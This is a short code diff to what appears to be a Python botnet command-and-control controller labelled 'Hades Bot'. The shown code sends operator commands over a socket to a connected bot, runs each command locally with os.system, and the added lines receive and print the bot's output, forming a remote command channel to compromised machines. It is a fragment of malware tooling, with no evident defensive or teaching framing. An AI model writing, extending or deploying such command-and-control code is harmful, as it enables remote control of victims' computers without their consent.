@@ -61,6 +61,10 @@ class Controller(object):
                     print(host_format,end='')
                     airbitrary_cmd_exec = os.system(cmd_read)
                     bot_command = client_socket.send(bytes(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Hades Bot-Command: ",'utf-8') + cmd_read.encode())
+                    output = client_socket.recv(buffer_size).decode()
+                    results = output.split(SEPARATOR)
+                    print(results)
+
 
         except Exception as Err:
             print(Err)
@@ -109,4 +113,3 @@ if __name__ == "__main__":
     listener.join()
     time_elapsed.start()
     time_elapsed.join()
-                           
